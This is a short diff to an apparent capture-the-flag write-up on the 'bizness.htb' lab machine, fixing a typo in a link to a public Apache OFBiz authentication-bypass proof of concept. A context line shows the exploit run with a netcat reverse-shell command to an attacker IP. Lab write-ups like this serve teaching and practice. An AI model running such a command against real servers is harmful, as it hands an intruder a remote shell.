@@ -97,7 +97,7 @@ Task Completed
 
 ![Image showing the login page of bizness.htb](/blog/biznesspics/loginbizness1.png 'Fig.2')
 
-- Let's use that [POS repo](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) we found in the beginning..
+- Let's use that [PoC repo](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) we found in the beginning..
 
 ```bash:Terminal 
 └─$ python3 exploit.py --url https://bizness.htb --cmd "nc 10.10.14.35 6969 -e /bin/bash"
